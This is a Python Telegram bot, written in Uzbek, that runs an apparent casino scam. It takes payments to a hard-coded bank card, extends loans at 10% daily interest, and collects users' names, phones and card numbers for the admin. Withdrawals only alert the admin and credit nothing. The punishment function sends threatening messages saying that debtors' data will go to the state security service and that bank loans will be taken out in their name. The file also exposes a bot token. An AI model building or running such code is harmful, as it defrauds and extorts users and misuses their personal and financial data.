import telebot
from telebot import types
import sqlite3
import random
import time
from datetime import datetime, timedelta

TOKEN = '8609558089:AAExgvs1_XR5jlj9RGC55zZStvc7nV_Z6hE'
bot = telebot.TeleBot(TOKEN)
ADMIN_ID = 8299021738
KARTA_RAQAM = "9860 6067 5582 9722"

# --- BAZA BILAN ISHLASH ---
def get_db_connection():
    return sqlite3.connect('casino_uzb.db', check_same_thread=False)

def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users 
                      (id INTEGER PRIMARY KEY, name TEXT, phone TEXT, 
                       balance REAL DEFAULT 0, debt REAL DEFAULT 0, 
                       last_debt_time TEXT, user_card TEXT)''')
    conn.commit()
    conn.close()

init_db()

# --- ASOSIY MENYU ---
def main_menu(uid):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🎰 O'yinlar", "👤 Profil", "💳 Depozit", "🎁 Bonus")
    markup.add("💸 Nasiya olish", "🔴 Qarzni to'lash", "💸 Pul yechish")
    if uid == ADMIN_ID:
        markup.add("📊 Admin: Ma'lumot")
    return markup

# --- JARIMA VA OGOHLANTIRISH ---
def apply_punishment(uid):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT debt, last_debt_time, name FROM users WHERE id=?", (uid,))
    res = cursor.fetchone()
    if res and res[0] > 0 and res[1]:
        debt, last_time, name = res[0], res[1], res[2]
        last_date = datetime.strptime(last_time, "%Y-%m-%d %H:%M:%S")
        days_passed = (datetime.now() - last_date).days

        if days_passed >= 1:
            interest = debt * 0.10 * days_passed
            new_debt = debt + interest
            cursor.execute("UPDATE users SET debt = ?, last_debt_time = ? WHERE id=?", (new_debt, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), uid))
            conn.commit()
            
            warning = (f"🚨 **SO'NGGI OGOHLANTIRISH!**\n\n"
                       f"Qarzingiz: **{new_debt:,} so'm**.\n"
                       f"Sizga qo'shimcha 12 soat muhlat. Aks holda ma'lumotlaringiz **DXX**ga topshiriladi "
                       f"va sizning nomingizdan banklardan **ONLAYN KREDIT** olish so'rovnomasi yuboriladi!")
            bot.send_message(uid, warning, parse_mode="Markdown")
    conn.close()

# --- START ---
@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    apply_punishment(uid)
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE id=?", (uid,))
    user = cursor.fetchone()
    conn.close()

    if user:
        bot.send_message(message.chat.id, "Xush kelibsiz!", reply_markup=main_menu(uid))
    else:
        bot.send_message(message.chat.id, "Ro'yxatdan o'tish uchun ismingizni yozing:")
        bot.register_next_step_handler(message, get_name)

def get_name(message):
    name = message.text
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add(types.KeyboardButton("📞 Raqamni yuborish", request_contact=True))
    bot.send_message(message.chat.id, f"Salom {name}, telefon raqamingizni yuboring:", reply_markup=markup)
    bot.register_next_step_handler(message, lambda m: save_user(m, name))

def save_user(message, name):
    if message.contact:
        uid, phone = message.from_user.id, message.contact.phone_number
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("INSERT OR IGNORE INTO users VALUES (?, ?, ?, 0, 0, None, 'Kiritilmagan')", (uid, name, phone))
        conn.commit()
        conn.close()
        bot.send_message(message.chat.id, "✅ Ro'yxatdan o'tdingiz!", reply_markup=main_menu(uid))
    else:
        bot.send_message(message.chat.id, "Tugmani bosing!")

# --- ASOSIY HANDLER ---
@bot.message_handler(func=lambda m: True)
def handle_all(message):
    uid = message.from_user.id
    apply_punishment(uid)

    if message.text == "🎰 O'yinlar":
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("📦 4 ta Quticha", "🚀 Crash", "🔙 Orqaga")
        bot.send_message(message.chat.id, "O'yinni tanlang:", reply_markup=markup)

    elif message.text == "👤 Profil":
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM users WHERE id=?", (uid,))
        u = cursor.fetchone()
        conn.close()
        msg = f"👤 Ism: {u[1]}\n📞 Tel: {u[2]}\n💳 Karta: {u[6]}\n💰 Balans: {u[3]:,} s\n🔴 Qarz: {u[4]:,} s"
        bot.send_message(message.chat.id, msg)

    elif message.text == "💸 Pul yechish":
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("SELECT balance, debt FROM users WHERE id=?", (uid,))
        res = cursor.fetchone()
        conn.close()
        if res[1] > 0:
            bot.send_message(message.chat.id, "⚠️ Qarzingiz bor! Pul yechish bloklangan.")
        elif res[0] < 20000:
            bot.send_message(message.chat.id, "⚠️ Minimal yechish: 20,000 so'm")
        else:
            bot.send_message(message.chat.id, "Plastik karta raqamingizni kiriting (16 talik):")
            bot.register_next_step_handler(message, get_withdraw_card)

    elif message.text == "💸 Nasiya olish":
        bot.send_message(message.chat.id, "Qancha nasiya kerak? (Masalan: 50000)")
        bot.register_next_step_handler(message, process_debt)

    elif message.text == "💳 Depozit" or message.text == "🔴 Qarzni to'lash":
        bot.send_message(message.chat.id, f"💳 Karta: `{KARTA_RAQAM}`\nTo'lovdan so'ng summani yozing:", parse_mode="Markdown")
        bot.register_next_step_handler(message, process_payment)

    elif message.text == "🔙 Orqaga":
        bot.send_message(message.chat.id, "Asosiy menyu:", reply_markup=main_menu(uid))

    elif message.text == "📊 Admin: Ma'lumot" and uid == ADMIN_ID:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM users")
        data = cursor.fetchall()
        report = "📊 **Foydalanuvchilar:**\n"
        for u in data: report += f"👤 {u[1]} | {u[2]}\n💰 B: {u[3]:,} | 🔴 Q: {u[4]:,}\n💳 K: {u[6]}\n---\n"
        bot.send_message(ADMIN_ID, report, parse_mode="Markdown")
        conn.close()

# --- FUNKSIYALAR ---
def get_withdraw_card(message):
    card = message.text
    if len(card) >= 16:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET user_card = ? WHERE id=?", (card, message.from_user.id))
        conn.commit()
        conn.close()
        bot.send_message(message.chat.id, "Qancha yechmoqchisiz?")
        bot.register_next_step_handler(message, lambda m: finish_withdraw(m, card))
    else:
        bot.send_message(message.chat.id, "Xato karta raqami!")

def finish_withdraw(message, card):
    try:
        amt = float(message.text)
        bot.send_message(message.chat.id, f"✅ So'rov adminga yuborildi. {amt:,} so'm tez orada kartangizga ({card}) tushadi.")
        bot.send_message(ADMIN_ID, f"💸 **PUL YECHISH!**\nID: {message.from_user.id}\nKarta: {card}\nSumma: {amt:,} s")
    except: bot.send_message(message.chat.id, "Faqat son yozing!")

def process_debt(message):
    try:
        amt = float(message.text)
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET balance = balance + ?, debt = debt + ?, last_debt_time = ? WHERE id=?", (amt, amt, now, message.from_user.id))
        conn.commit()
        conn.close()
        bot.send_message(message.chat.id, f"✅ {amt:,} so'm nasiya berildi.")
    except: bot.send_message(message.chat.id, "Xato!")

def process_payment(message):
    try:
        amt = int(message.text)
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("✅ To'ladim", callback_data=f"pay_{amt}"))
        bot.send_message(message.chat.id, f"{amt:,} so'm to'lov qildingizmi?", reply_markup=markup)
    except: bot.send_message(message.chat.id, "Faqat son!")

@bot.callback_query_handler(func=lambda c: c.data.startswith("pay_"))
def admin_conf(call):
    amt = call.data.split("_")[1]
    markup = types.InlineKeyboardMarkup().add(
        types.InlineKeyboardButton("✅ Tasdiqlash", callback_data=f"conf_{call.from_user.id}_{amt}"),
        types.InlineKeyboardButton("❌ Rad etish", callback_data=f"rej_{call.from_user.id}"))
    bot.send_message(ADMIN_ID, f"🔔 To'lov! {amt} s\nID: {call.from_user.id}", reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data.startswith(("conf_", "rej_")))
def final_pay(call):
    d = call.data.split("_")
    uid, amt = int(d[1]), float(d[2]) if len(d)>2 else 0
    conn = get_db_connection()
    cursor = conn.cursor()
    if d[0] == "conf":
        cursor.execute("UPDATE users SET balance = balance + ? WHERE id=?", (amt, uid))
        bot.send_message(uid, "✅ To'lov qabul qilindi!")
    else: bot.send_message(uid, "❌ Rad etildi.")
    conn.commit()
    conn.close()
    bot.delete_message(call.message.chat.id, call.message.message_id)

bot.polling(none_stop=True)
        
            
        
        
    
  
